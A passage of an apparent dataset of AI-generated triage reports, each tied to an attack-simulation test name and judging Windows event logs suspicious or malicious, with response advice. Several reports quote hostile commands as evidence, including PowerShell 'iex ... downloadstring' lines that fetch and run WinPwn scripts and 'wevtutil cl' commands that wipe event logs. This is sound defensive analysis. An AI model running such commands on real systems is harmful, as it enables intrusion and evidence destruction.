  - Clearing event logs (System, Security, PowerShell) is highly suspicious and often associated with malicious intent to cover tracks.
  - The fact that the logs were cleared in quick succession after executing a PowerShell command to query potentially sensitive account data strengthens the suspicion.

### Conclusion:

- The combination of querying active directory information using PowerShell, followed by clearing of event logs without any prior evidence of routine maintenance or log management procedures, is suspicious.

### Recommended Resolution:

- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Remediation:**
   - Isolate `Server002` from the network to prevent further activity until a detailed forensic analysis can be conducted.
   
2. **Forensic Analysis:**
   - Conduct a full forensic review of the system, focusing especially on timelines and other logs (e.g., firewall, antivirus) to corroborate suspicious activities.
   - Check for unauthorized changes or unusual patterns in user accounts, files, and services.

3. **Review Access Control:**
   - Review user permissions, especially for `admin_test` to ensure they don't have excessive or improper privileges.
   - Audit recent changes to group memberships, policies, or shared resources.

4. **Enhance Monitoring:**
   - Implement and ensure advanced logging mechanisms are in place and protected from unauthorized clearing.
   - Monitor for any further attempts to clear logs or execute suspicious commands.

These actions, combined with further investigation, will help determine the root cause and scope of the suspicious activity, potentially identifying malicious behavior or activity within the environment."
Discover System Language by Windows API Query,"Upon reviewing the provided logs, several events suggest potentially suspicious activities:

1. **Log Clearing Operations:**
   - Multiple event logs have been cleared by the user `admin_test` as indicated by Event ID `104` in the System log and Event ID `1102` in the Security log. Clearing logs, especially security logs, is often associated with attempts to cover tracks from unauthorized or malicious activities.

2. **Wevtutil Executions:**
   - The `wevtutil.exe` utility, which is used to manage event logs, is seen executing commands like `cl Application`, `cl System`, and `cl Security` as per Sysmon Event IDs `18007`, `18011`, and `18023`. This coincides with the log clear entries mentioned above. The same command-line execution observed in Sysmon logs is indicative of a direct attempt to manipulate or clear event logs, which is an anomaly for regular administrative tasks.

3. **Suspect File Execution:**
   - There is a suspicious execution of `LanguageKeyboardLayout.exe` from a temporary directory as observed in Sysmon Event ID `18038`. This application doesn't have a recognized file version or digital signature, which makes it particularly suspect. It was executed via `cmd.exe`, a technique sometimes utilized for executing malware payloads.

4. **Execution of Potentially Unwanted Commands:**
   - The usage of `whoami.exe` and `hostname.exe` are typical reconnaissance or information-gathering steps that can be part of a broader malicious campaign to profile the system.

These combined observations suggest a strong indication of malicious intent. The clearing of event logs to potentially erase evidence of suspicious activity, unusual script execution from temporary directories, and unauthorized use of administrative commands all support this conclusion.

### Assessment:
The collected evidence points towards unauthorized and potentially malicious activity. The process of clearing logs indicates an attempt to hide traces of these activities, which is a common trait in intrusions.

### Resolution:
- **MALICIOUS**: The events showcase actions that align with common post-exploitation activities, such as reconnaissance and cleaning of tracks, typical of attempts to persist undetected within a network.

### Guidance on How to Proceed:
1. **Immediate Investigation**:
   - Conduct a forensic analysis on the host `Server002` to determine the extent of the compromise.
   - Capture the volatile memory and disk images for deeper analysis.

2. **Containment**:
   - Isolate `Server002` from the network to prevent further propagation or data exfiltration.
   
3. **Log Analysis**:
   - Review all available logs that have not been cleared and check backups or monitoring systems for indicators of compromise (IoCs).

4. **Remediation**:
   - Update all security patches and ensure antivirus definitions are current.
   - Change all potentially affected credentials and implement stronger access controls.
  
5. **Monitoring and Alerts**:
   - Set up enhanced monitoring and alerting for activities such as log clearing and execution of unexpected processes.
   - Regularly audit and review access privileges on critical systems. 

By following these steps, the organization can mitigate the current threat and bolster defenses against future attacks."
Detect a Debugger Presence in the Machine,"**Detailed Analysis of Windows Event Logs:**

1. **System Logs:**
   - **Log File Clearing Events (EventID 104):** Multiple log file clearing events have been observed for system, security, and PowerShell logs. Specifically, logs are cleared by the user ""admin_test"" on ""SERVER002"" using `wevtutil.exe`. Clearing event logs, especially in a short time frame, can indicate an attempt to cover tracks, which is often associated with malicious activity.
   - **Time Change Events (EventID 4616 and 24):** The system time has been changed backward slightly, a common technique used by attackers to evade time-based detection rules in audit logs.
   - **Privilege Escalation (EventID 4672):** The user ""admin_test"" has gained multiple high privileges such as SeDebugPrivilege, SeBackupPrivilege, and SeSecurityPrivilege, which allow significant control over the system. 
   
2. **Windows PowerShell Logs:**
   - **PowerShell Script Activity (EventID 600):** There are recorded instances of PowerShell in use with a command script checking for debugger processes and flags. This behavior, although not definitively malicious by itself, can be indicative of reconnaissance or anti-analysis measures typically used in malicious scenarios.

3. **Security Logs:**
   - **Logon Events (EventID 4624):** A logon event using NTLM authentication is recorded for ""admin_test"". In itself, this does not indicate malicious activity but can be part of a larger malicious action if combined with other logs.

4. **Sysmon Logs:**
   - **Process Creation Events (EventID 1):** The process `wevtutil.exe` is used recurrently by ""admin_test"" to clear logs. This confirms the pattern of activity intended to erase evidence on the host.
   - **Combination of System and Network Privileged Services:** Various legitimate services such as Microsoft Edge Update and PowerShell are running as SYSTEM user, which looks normal. However, the excess of `wevtutil.exe` executions by the user ""admin_test"" under these circumstances contributes to suspicious activity overall.

5. **Application Logs:**
   - **Routine Edge Update Service (EventID 0):** The stopping of the Edge Update Service is routine, but combined with the overarching suspicious behavior observed, it can be reviewed for further context.

**Assessment:**
The details presented in the logs suggest that an administrative-level user has conducted actions to manipulate and obscure activities on the machine. The clearing of event logs shortly after certain high-privilege actions and time changes is a significant indicator of an attempt to hide unauthorized or nefarious actions. This combination of behaviors is consistent with post-exploitation techniques often used in malicious activities.

**Resolution: MALICIOUS**
The log events strongly suggest malicious behavior, likely involving an internal account being used to conduct activities that indicate a compromise or misuse of the system.

**Guidance on Proceeding:**
1. **Immediate Quarantine:** Isolate the affected machine (Server002) from the network to prevent further damage or lateral movement within the organization.
2. **Account Investigation:** Investigate the user account ""admin_test"" for any anomalies in usage patterns, and verify whether it may have been compromised.
3. **Review Access Logs:** Check access logs in the environment for any unauthorized logins or privilege escalations across other systems using this account.
4. **Malware Detection and Response:** Run a comprehensive malware scan with updated signatures to detect any remnants of potential exploit or backdoor.
5. **Log and Document:** Thoroughly document all detected events and actions taken, and prepare for potential forensic analysis.
6. **Security Policy Review:** Evaluate the security policies governing administrative access and logging to prevent log deletion and cover tracks for future incidents."
User Discovery With Env Vars PowerShell Script,"### Analysis of the Logs:

1. **Log Clearing Activity:**
   - **EventID 1102 in Security log and EventID 104 in System log** are indicative of log clearing activities. These events show that logs have been cleared by the user ""admin_test"" on ""Server002"". Log clearing is often associated with malicious activity as attackers typically clear logs to erase traces of their actions.

2. **Process Execution:**
   - **WHOAMI and HOSTNAME Executions:** There are multiple executions of `whoami.exe` and `hostname.exe` which could be benign if used for legitimate administrative purposes. However, combined with log clearing activities, it suggests a potential effort to discover user and system information.
   - **WEVTUTIL Execution:** The execution of `wevtutil.exe` with the `cl` (clear log) command indicates deliberate clearing of specific event log channels such as ""Sysmon"", ""Application"", and ""System"".

3. **Credential Access Attempt (EventID 5379):**
   - Multiple entries for EventID 5379 in the Security log are present, indicating failed attempts to read credentials for a Microsoft account. The return code `3221226021` indicates a failure, possibly due to incorrect credentials or lack of permissions.

4. **PowerShell Script Execution:**
   - Execution of PowerShell commands designed to output the current active username to a file (`CurrentactiveUser.txt`). While this might be a benign administrative task, the context of log clearing raises suspicion.

5. **Windows Defender State:**
   - The Application log confirms that Windows Defender is in a normal operational state, indicated by `SECURITY_PRODUCT_STATE_ON`.

6. **Scheduled Software Updates and Security Patches:**
   - Events involving `wuauclt.exe` and `MpSigStub.exe` alongside security updates suggest routine system update processes are occurring, which generally indicate normal system maintenance.

### Assessment of Situation:

The sequence of events indicates:
- The suspicious combination of log clearing activity, execution of system enumeration commands (`whoami` and `hostname`), and failed credential access attempts.
- The use of legitimate system tools (`wevtutil.exe`, `powershell.exe`) in a potentially inappropriate manner (log clearing, user information retrieval).
  
The execution of these actions in a close time frame, particularly after the logs were cleared, implies possible malicious intent or security policy violations, particularly if such actions are unexpected or unauthorized by policy.

### Conclusion:

**Resolution: SUSPICIOUS**

Further investigation is needed to confirm the legitimacy of the actions performed on the system. This includes verifying:
- The authorization and intent behind the actions of the user ""admin_test"".
- If similar patterns have been recorded on other systems.
- The necessity of implementing stricter logging, monitoring, and user-access controls.

**Guidance on How to Proceed:**
1. **Conduct Interviews:**
   - Interview the user ""admin_test"" to understand if they were performing routine administrative tasks.
   
2. **Verify User Permissions:**
   - Ensure ""admin_test"" has only the necessary privileges and responsibilities.

3. **Detailed Forensic Analysis:**
   - Conduct a forensic review of the system to identify any unauthorized modifications or data exfiltration.

4. **Improve Monitoring:**
   - Enhance monitoring and alerting for critical actions such as log clearance, particularly if not expected in normal operations.

5. **Policy Review:**
   - Evaluate and update security policies, including the handling of administrative tools and logging practices."
File and Directory Discovery (PowerShell),"Upon reviewing the provided Windows event logs, several entries have been identified as having potential significance when assessing the security posture of the environment.

Here is the detailed analysis:

### Sysmon Log:
- **Frequent Use of `wevtutil.exe`:** There are multiple entries showing the execution of `wevtutil.exe` with the `cl` (clear logs) command targeting different logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This suggests an attempt to clear these logs.
  
- **Suspicious PowerShell Activity:** There is an entry showing the execution of PowerShell running commands that recursively list file system entries (`ls -recurse`, `get-childitem -recurse`, `gci -recurse`). This might indicate reconnaissance activity to list files and directories.

### System Log:
- **Log Clearance:** The System log shows events with ID 104 indicating successful log clear operations. These correlate with the sysmon activities related to `wevtutil.exe`.

### Windows PowerShell Log:
- **PowerShell Execution:** This log details the execution of a PowerShell command to recursively list directory contents, which aligns with the suspicious activity seen in the Sysmon log.

### Security Log:
- **Security Log Clearance:** The security event log entry with ID 1102 indicates the security log was cleared, an event commonly associated with malicious activities to cover tracks.

### Assessment and Resolution:
The combination of these activities—particularly the clearing of various key system logs (Sysmon, Application, System, Security, Windows PowerShell) and the execution of PowerShell commands to possibly enumerate filesystem contents—strongly suggests unauthorized and potentially malicious behavior. The use of a high-integrity level and its association with the admin_test user raises additional concerns about privilege misuse.

### Conclusion:
- **Resolution: MALICIOUS.**
  
### Guidance:
Given these observations, it is crucial to initiate an in-depth forensic investigation to ascertain the extent of any potential compromise. Immediate actions should include:
- Securing the affected system by isolating it from the network to prevent further malicious activities.
- Conducting a thorough review of user and process activities around the identified timeframe.
- Evaluating any unauthorized changes or data exfiltration.
- Reviewing and possibly revoking privileges of the compromised accounts.
- Engaging with incident response teams to monitor for any anomalies in the broader network ecosystem."
Elevated group enumeration using net group (Domain),"After reviewing the provided logs, here is a detailed analysis of the observed activities across various logs, focusing on the Sysmon, System, Security, and Application logs:

### Detailed Analysis

#### Sysmon Log Analysis
1. **Frequent EdgeUpdater Activity:**
   - A significant number of entries are associated with Microsoft Edge Update processes such as `MicrosoftEdgeUpdate.exe`. This behavior is typical for systems updating or maintaining Microsoft Edge. The provided logs indicate multiple `MicrosoftEdgeUpdate.exe` executions, their processes spawning and terminating, and all under the `NT AUTHORITY\SYSTEM` account.

2. **Clearing of Event Logs:**
   - Multiple `wevtutil.exe` commands (`cl` for clearing logs) were executed by `SERVER002\admin_test`, specifically to clear logs of channels like `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `Windows PowerShell`.
   - This methodically clearing of logs is a hallmark of malicious activity, typically used to cover tracks.

3. **Enumeration Commands:**
   - `cmd.exe` was used to execute several `net group` commands to enumerate domain groups such as ""Account Operators"", ""Domain Admins"", etc. The command structure suggests privilege enumeration which could imply reconnaissance activity often seen in malicious activities.

#### System Log Analysis
- The event log entries show that the `System` and `Windows PowerShell` logs were cleared by the `admin_test` user.

#### Security Log Analysis
- The `Security` log was also cleared by the `admin_test` user, recorded in Event ID 1102. Clearing the security log is particularly concerning from a security standpoint and strongly suggests an attempt to hide malicious activity.

- Privilege granted events (Event ID 4672) for `admin_test` show extensive privileges, including `SeDebugPrivilege`, typically unnecessary for regular users and indicative of potential misuse or preparatory actions for further malicious acts.

#### Application Log Analysis
- No direct indicators of compromise were noted in the Application logs provided, aside from correlation with other logs where activities like SPP events occurred.

### Assessment and Conclusion

Based on the indicators observed, particularly the clearing of event logs combined with privilege escalation attempts and suspicious domain group enumeration activities, we can confidently assess the situation as containing potentially malicious activity. The use of the `wevtutil` command to clear logs and the enumeration of domain groups suggest deliberate actions to access sensitive information and cover up tracks, common tactics in cyber intrusion cases.

### Final Resolution

**Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate Server002 from the network to prevent further potential malicious activity.
   - Preserve all current logs and artifacts for forensic analysis.
   - Initiate a complete endpoint detection and response (EDR) analysis on Server002 to gather any additional evidence not contained in these logs.

2. **Further Investigation:**
   - Perform a detailed security audit on accounts, specifically focusing on `admin_test`, including password policies and potential compromised credentials.
   - Analyze any potential lateral movement from Server002 and review other systems’ logs for similar patterns.

3. **Preventative Measures:**
   - Implement stricter user activity monitoring and alerting for unusual activities, such as event log clearing and high-privilege access events.
   - Review and tighten access controls and privilege assignments to reduce the risk of privilege misuse.

This analysis concludes the investigation of the provided logs with a determination of malicious activity, necessitating an urgent response and further actions as outlined."
WinPwn - powerSQL,"### Detailed Analysis:

Upon examining the Windows event logs from the provided host, several indicators suggest potentially malicious activity. Let's break it down:

1. **Log Clearing Events:**
   - **Security Log Event ID 1102:** The security log was cleared by the user ""admin_test"". This is a strong indication of malicious activity as attackers often clear logs to cover their tracks.
   - **Sysmon Command Line Events:** There are several instances of `wevtutil.exe` being executed to clear logs which correspond to the log clearing events.

2. **Suspicious PowerShell Activity:**
   - **Sysmon Event ID 1 (Process Creation Event):** Shows execution of PowerShell with a command line that includes downloading and executing a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). This is often indicative of a malicious script intended to compromise or gather information from the host.
   - **Linked Windows PowerShell Logs:** Logs confirm the suspicious PowerShell session and indicate it was used to execute scripts fetched from an external source.

3. **Privilege Escalation Attempts:**
   - **Security Log Events ID 4672:** Shows assignation of sensitive privileges such as `SeDebugPrivilege`, which are typically used in privilege escalation attempts. This can be normal for SYSTEM processes but should be verified in the context of other malicious indicators.

4. **Persistence Indicators:**
   - **Security Log Events ID 4672 & 4624:** Elevated token logs and SYSTEM account activities indicate an attempt to maintain persistence under high privilege processes. 

5. **Network Anomalies & Execution of Known Tools:**
   - **Security/Sysmon Logs:** Various processes related to network and system utilities were executed (`svchost.exe`, `whoami.exe`, etc.). While some degree of utilization is expected in regular operations, in conjunction with other logs, it raises suspicion.

### Assessment:

There is a pattern of behavior consisting of log clearing, suspicious external resource fetching and script execution, and the use of privileged capabilities that point toward a malicious intent.

### Resolution: MALICIOUS

Based on the indicators of compromise present in the Windows event logs, it is evident that the host was involved in malicious activities. The combination of log clearing, suspicious PowerShell usage to fetch and execute a script from an external source, and heightened privileges being utilized all indicate a probable system compromise.

### Recommended Actions:

1. **Immediate Incident Response:**
   - Isolate the affected machine from the network to prevent further infection or data exfiltration.
   - Conduct a forensic disk-image backup to preserve evidence and aid in further investigation.
   
2. **System Review and Remediation:**
   - Analyze the downloaded scripts and any files involved to understand the payload and investigate for backdoors or persistence mechanisms.
   - Revoke affected credentials and enforce a password change, especially for privileged accounts involved.
   - Audit system integrity checks and verify all sensitive files and settings.

3. **Post-Incident Recovery:**
   - Once clear of malicious payloads, update security patches and configurations.
   - Perform thorough security policy reviews and consider deploying additional security monitoring solutions.
   - Reintegrate the host into the network post-verification of all security protocols being in place and updated."
System Owner-User Discovery,"Upon reviewing the provided Windows event logs, I have identified indicators that suggest the occurrence of activities that are potentially suspicious and warrant further investigation. Below is the detailed analysis highlighting these findings:

### Log Analysis

1. **Security Log**: 
   - Event ID 1102 indicates that the event log was cleared. The log clearance was performed by the user `admin_test`. Typically, event log clearance is an activity that adversaries perform to cover their tracks and may indicate malicious intent. It can suggest an attempt to hide evidence of malicious behavior.

2. **Sysmon Log**: 
   - A series of events involving the `wevtutil.exe` process line up with the log clearance, indicating it was possibly used to clear the Windows Event logs. The execution of `wevtutil.exe` with the `cl` (clear log) option further corroborates the log clearance activity as captured in the Security and System logs.
   - There is a command execution involving `cmd.exe` running a rather composite script using `whoami`, `wmic`, and `qwinsta`, which seems to involve account enumeration and session listing on the server (process executed by the `admin_test` account). Such behavior indicates potential reconnaissance or enumeration activity commonly associated with lateral movement or privilege escalation attempts.
   - Multiple instances of command-line utilities (`whoami.exe`, `cmd.exe`, `wmic.exe`) were executed in rapid succession, suggesting possible script-based or automated activity rather than manual and legitimate administrative actions.

3. **System Log**:
   - Event ID 104 also captures actions suggesting the clearance of other logs (System, Windows PowerShell) by `admin_test`, reaffirming the suspicious nature of the activity due to the intentional removal of historical records.

4. **Application Log**:
   - Windows Defender appears to be active (`SECURITY_PRODUCT_STATE_ON`). However, the presence of such a record does not mitigate the apparent indicators of potentially suspicious behavior highlighted in other logs.

5. **Indicators of administrative tools use**:
   - Tools like `whoami`, `wevtutil`, `cmd`, `conhost`, and `WMIC` are legitimate, yet their usage in the given context associated with cleaning logs and system enumeration could represent misuse by an intruder with administrative privileges or a malicious insider.

### Conclusion

Based on the evidence collected, the activities represented in these logs are consistent with suspicious behavior, particularly due to systematic log clearance combined with potential reconnaissance actions (account and session enumeration). This points towards possible malicious intent or the need for a deeper investigation into whether these actions were intentional for unauthorized access or lateral movement.

### Resolution

**Resolution: SUSPICIOUS**

Given the suspicious nature of the log deletion activity executed alongside system and account enumeration using administrative commands, it is imperative to conduct further investigation. This investigation should include:

- Confirming the legitimacy of the `admin_test` user's actions around the timestamp of the activities.
- Performing a thorough review of access rights and recent changes in user roles/permissions.
- Checking for additional unauthorized access indicators or anomalies in network behavior or other systems.
- Reviewing other potentially affected systems for similar patterns or indicators of compromise.

Given these findings, further analysis and potential incident response actions should be conducted promptly to assess any potential security incidents or threats more fully."
WinPwn - GPORemoteAccessPolicy,"Based on the provided log entries, we can observe several indicators of potentially malicious activity:

1. **PowerShell Activity**:
   - The PowerShell logs show the execution of a script (`WinPwn.ps1`) from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`). This script is executed via PowerShell with an `Invoke-Expression` (`iex`) command, which is a common method used by attackers to execute scripts from the web directly. This is highly suspicious and potentially harmful.
   - The command also leverages the PowerShell scripting capabilities to possibly perform unauthorized actions, as seen in the use of `GPORemoteAccessPolicy`.

2. **Event Log Clearing**:
   - The Security log shows an entry with EventID 1102, which indicates that the security logs were cleared. This action is often performed by attackers to cover their tracks by removing evidence of their malicious activities.

3. **Privilege Escalation**:
   - The Security logs contain EventID 4672, indicating that a user (`admin_test`) was assigned special privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges can be leveraged by attackers to escalate their access and perform system-level operations without restrictions.

4. **System Time Manipulation**:
   - The System log indicates events where system time was abruptly changed (EventID 4616), which can be indicative of attempts to disrupt time-based security detections or logs that rely on accurate timestamps.

5. **Frequent Use of `wevtutil.exe`**:
   - The Sysmon logs indicate multiple executions of `wevtutil.exe` with the command to clear log channels. This utility is used to manage Windows Event logs, and its frequent use, especially in conjunction with log clearing activities, aligns with attempts to remove traces of activity.

6. **Security Product Status**:
   - The Application log shows Windows Defender status messages repeatedly, suggesting monitoring or checking of the security status potentially in response to detected alerts.

### Assessment:

The combination of script execution from an untrusted external source using PowerShell, log clearing, and privilege escalation strongly suggests that the system has experienced malicious activities. These actions align with common techniques used in post-exploitation and persistence phases of a compromise.

### Resolution:

**MALICIOUS** - The logs clearly indicate malicious activity due to the execution of an external PowerShell script, event log clearing, and suspicious privilege escalations.

### Guidance:

1. **Immediate Response**:
   - Isolate the affected system from the network to prevent further spread of potential threats.
   - Conduct a full malware and rootkit scan on the system using an updated antivirus tool.

2. **Incident Investigation**:
   - Analyze the downloaded script (`WinPwn.ps1`) for malicious code and identify any unauthorized changes made to the system.
   - Review additional logs around the mentioned timeframe for any other indicators of compromise.

3. **Recovery and Hardening**:
   - Restore the system from a known good backup to ensure no malicious code remains.
   - Apply security patches and ensure PowerShell execution policies restrict running untrusted scripts.
   - Enhance monitoring and implement stricter logging policies to detect suspicious activities early."
Enumerate Active Directory Users with ADSISearcher,"After analyzing the provided log entries across various sources, here's a detailed assessment of the situation:

1. **PowerShell Logs:**
   - Multiple PowerShell 600 events indicate PowerShell executions. The command `powershell.exe & {([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()}` suggests the enumeration of user accounts in Active Directory. Such PowerShell scripts are typically used for reconnaissance.

2. **Application Logs:**
   - Generally benign activities were observed. Windows Defender is active, as indicated by the `SECURITY_PRODUCT_STATE_ON` state.
   - `Microsoft Edge` update service activities appear normal and ongoing.

3. **System Logs:**
   - Events 104 and 1102 related to the clearing of event logs indicate potentially suspicious behavior. Log clearing can be an indicator of malicious activity intended to erase traces.
   - Windows Update activities appear typical.

4. **Sysmon Logs:**
   - `wevtutil.exe` is used multiple times to clear logs for Windows PowerShell, Application, and System logs. This aligns with suspicious behavior, indicating possible log tampering.
   - Execution of `whoami.exe` and `hostname.exe` suggests system reconnaissance.
   - Microsoft Edge update processes show standard behavior and do not appear suspicious.

5. **Security Logs:**
   - Event 1102 in the Security log specifically points out that the event log was cleared. This activity performed by user `admin_test` is consistent with attempts to hide malicious activity.
   - Event 4616 reports time changes, though they lack context to cause concern by themselves.

### Assessment:
- **Suspicious Behavior**: There is evidence suggesting reconnaissance activity and attempts to tamper with the event logs (clearing logs) by the user `admin_test`. The command `powershell.exe & {([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()}` typically signifies directory enumeration possibly used in a targeted attack scenario.
- **Log Cleansing**: The use of `wevtutil` to clear logs is a strong indicator of malicious intent, as this is a common tactic to cover tracks.
  
### Resolution:
- **SUSPICIOUS**: The activities documented require further investigation to confirm their intent. The combination of user enumeration and log clearance are typical in suspicious activities but don't confirm malicious intent without corroborative activities indicating compromise. Further action should include:
  - Monitoring `admin_test` and related accounts for unusual activities.
  - Reviewing system and network access logs for any unauthorized access.
  - Implementing stricter monitoring on PowerShell and script execution.
  - Reviewing the necessity of PowerShell script permissions and `admin_test` role capabilities.
  - Considering forensic activity to recover cleared log information, if needed.

After these steps, if more corroborative evidence of unauthorized access or account misuse is found, this could elevate the issue to a confirmed compromise."
BIOS Information Discovery through Registry,"### Detailed Analysis of the Windows Event Logs:

#### 1. Log Clearing Activity:
- **Security Log Clearance (Event ID 1102)**: The security log indicates a log clearance by the user `ADMIN_TEST` at `2024-10-23 18:38:40`. This action is a critical event, as it can indicate an attempt to cover tracks after unauthorized or malicious activities.
- **System Log Clearance (Event ID 104)**: Similarly, the system log indicates log clearance activities by the same user `ADMIN_TEST`.

#### 2. Suspicious Process Activity:
- **Usage of `wevtutil` Tool**: The Sysmon logs show repeated invocations of `wevtutil` with the 'cl' (clear) flag, which is used to clear event logs. This correlates with the cleared logs mentioned above and is highly suspicious. Normally, such actions are not routinely performed and should be thoroughly investigated.
  - `CommandLine`: `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
  - The `wevtutil` tool being used multiple times to clear different logs (Security, System, Application, and even Windows PowerShell).

#### 3. Other System-Related Activity:
- **Time Change Event (Event ID 4616)**: The system logs include events indicating time changes. While not immediately suspicious, if this is unauthorized, it can be used in attempts to skew timestamps and could be part of anti-forensic activities.

#### 4. Edge Update Activity:
- Routine activities related to `MicrosoftEdgeUpdate.exe` are observed. While these might be legitimate, if they are occurring excessively or in proximity to other suspicious activities, they should be reviewed to ensure they weren't leveraged for persistence or download of malicious payloads.

#### Assessment:

The presence of log clearance operations using `wevtutil`, a known technique in anti-forensics, in conjunction with the cleared logs themselves, suggests that there is an attempt to hide execution artifacts or potential unauthorized access. The timing and context of these events align closely, pointing towards non-benign motives.

### Resolution: SUSPICIOUS

The activities identified appear suspicious and need further investigation. The `admin_test` account needs to be reviewed for misuse or compromise. It is advisable to perform the following actions:
- **User Verification**: Verify the actions and legitimacy of the `admin_test` account.
- **Impact Assessment**: Determine if there's been any unauthorized data access or exfiltration following these events.
- **System Inspection**: Check for any other indicators of compromise, such as unusual network traffic or changes in system settings.
- **Strengthen Monitoring**: Increase monitoring on this system and related accounts, looking for any further abnormal behavior.

This investigation suggests that precautionary steps and potentially a deeper forensic investigation are necessary to rule out malicious intent."
Packet Capture Windows Command Prompt,"### Log Analysis

#### Suspicious Behavior Identified:

1. **Process Usage:**
   - There is the execution of `wevtutil.exe` with the `cl` (clear) command multiple times to clear various event logs such as Sysmon, Application, System, and Security. This activity involves the user `SERVER002\admin_test`.
   - Utilization of `wevtutil.exe` to clear logs can be an attempt to hide malicious activity or cover tracks, especially when used in conjunction with administrative operations.

2. **Command Line Activity:**
   - The presence of PowerShell scripts that download and execute an installer for Wireshark from an official mirror. The command executed is: `Invoke-WebRequest -OutFile ""C:\Path\wireshark_installer.exe"" https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe, Start-Process ""C:\Path\wireshark_installer.exe"" /S`
   - This activity suggests that potentially legitimate software is downloaded and executed silently with a `/S` switch which indicates a silent installation, commonly used in scripted automation but also by threat actors to further payloads without user consent.

3. **Installation of Software:**
   - Execution of `wireshark_installer.exe` and subsequent execution of Visual C++ Redistributable files related to the installation of Wireshark (`vc_redist.x64.exe`).
   - While Wireshark is a legitimate software used for network analysis, its installation in this manner could suggest a potential tool for network sniffing if not explicitly authorized.

4. **Event Log Clearance:**
   - Clearance of event logs as captured in the System log (Event ID 104) and Security log (Event ID 1102), initiated by the same user `admin_test`, indicates a possible attempt at anti-forensic behavior.

#### Indicators of Malicious Activity:

- **Clearing of Logs (Sysmon, System, Security):**
   - Logs being cleared (as indicated by the consistent use of `wevtutil.exe` with `cl` command) in close temporal proximity to PowerShell activity and installation of packet sniffing software are suspicious. Such attempts are typical of post-compromise actions attempting to obscure previous activities.

- **Execution Context:**
   - The high integrity level and administrative privileges indicate that these operations were executed by a user with elevated access rights, which increases the risk if the user account is compromised or misused.

### Assessment:
The behavior observed is indicative of a potential compromise. The sequence of downloading potentially legitimate tools, immediate silent installation, and log clearance is suspicious. Together, these actions align with tactics used by advanced attackers to establish persistence, gather information, or prepare for further attacks while maintaining stealth.

### Resolution: **MALICIOUS**

### Recommendations for Further Action:
1. **User Activity Review:**
   - Investigate the user `SERVER002\admin_test` for unauthorized access or indicators of compromised credentials.
  
2. **Network Monitoring:**
   - Verify network traffic to check for unusual patterns or data exfiltration, particularly stemming from the use of Wireshark.

3. **Systems Audit:**
   - Conduct a full audit of system changes and installations to confirm unauthorized software or configuration changes.

4. **Forensic Analysis:**
   - Consider an in-depth forensic analysis of the host to determine the full extent of potential tampering or malicious activity.

5. **Change Credentials:**
   - Reset the credentials for the user `admin_test` and audit other administrative accounts for anomalies.

6. **Strengthen Logging and Monitoring:**
   - Enhance monitoring of administrative activities and the use of command-line interfaces to prevent and quickly detect similar patterns in the future."
WinPwn - PowerSharpPack - Seatbelt,"Upon analyzing the provided Windows event logs, a few activities stand out as suspicious and possibly indicative of malicious actions. Here's a detailed breakdown:

### Indicators of Malicious Activity:

1. **Event Log Clearing:**
   - Multiple entries involving the clearing of event logs (`EventID 1102`) for Security, System, and Windows PowerShell channels using `wevtutil.exe`. The user `SERVER002\admin_test` is associated with these actions.
   - Clearing logs is often an attempt to cover tracks following unauthorized actions, suggesting potentially malicious intent.

2. **Suspicious PowerShell Activity:**
   - Repeated PowerShell execution using the command: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')`. This command downloads and executes a script from a GitHub repository.
   - The script `Invoke-Seatbelt.ps1` is known for querying system and security configurations, often used for reconnaissance in penetration testing or malicious operations.

3. **Time Manipulation and Kernel Events:**
   - Time change events (`EventID 4616`) without a clear context can suggest attempts to evade time-based detection systems or logs, though further context would be needed to confirm malicious intent.

4. **Execution of Administrative/Reconnaissance Tools:**
   - The presence of `whoami.exe`, `HOSTNAME.EXE`, and other system utilities being run may suggest reconnaissance attempts to gather information about the system environment.
   - It could indicate a user or script is validating access or conducting an initial survey of the system state.

### Assessment:
Given these logs, the combination of log clearing, suspicious external PowerShell script execution, and the use of administrative utilities suggest a coordinated effort that is indicative of potentially malicious activity. The likely scenario points to an attempt at gaining further foothold or reconnaissance within the system.

### Conclusion:
**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Isolation**: The involved machine (Server002) should be isolated from the network to prevent further potential malicious activity.
- **Full Forensic Investigation**: Conduct a comprehensive forensic investigation on the machine to identify the full extent of the compromise.
- **Review of User Activities**: Investigate the actions and permissions associated with `admin_test` and any paths that may have been leveraged for unauthorized access.
- **External Communication Checks**: Evaluate any external communications indicated within other logs or systems for data exfiltration attempts or further commands.
- **Security Patch and Policy Review**: Ensure that all relevant security patches are applied and review security policies to prevent similar incidents in the future.
- **Recovery and Strengthening**: Based on findings, take necessary recovery actions and strengthen defenses, possibly with enhanced monitoring and alerts for similar activities."
DNS Server Discovery Using nslookup,"Upon analyzing the provided Windows event logs, several events stand out as potentially suspicious and indicative of unusual system behavior. Here is a detailed analysis:

1. **Log File Clearing (EventID: 104, 1102)**:
   - Multiple logs state that an account (admin_test) with high privileges cleared the logs of different channels (System, Windows PowerShell, Security). This action is highly suspicious as clearing logs is often done by attackers to cover their tracks and hide malicious activity.

2. **Unusual Process Execution**:
   - We observe frequent use of `wevtutil.exe` with arguments to clear log channels, including Sysmon/Operational, Application, System, Security, and Windows PowerShell. Execution of `wevtutil.exe` with commands to clear logs is typically suspicious as it indicates an attempt to remove evidence of activity.
   - There is a repeated invocation of administrative and system utilities like `cmd.exe`, `nslookup.exe`, `whoami.exe`, and `hostname.exe` by the same user. While these tools can be used for legitimate purposes, their pattern of use in this context (especially following Log Clearing) suggests reconnaissance or testing of access.

3. **Network Command Execution**:
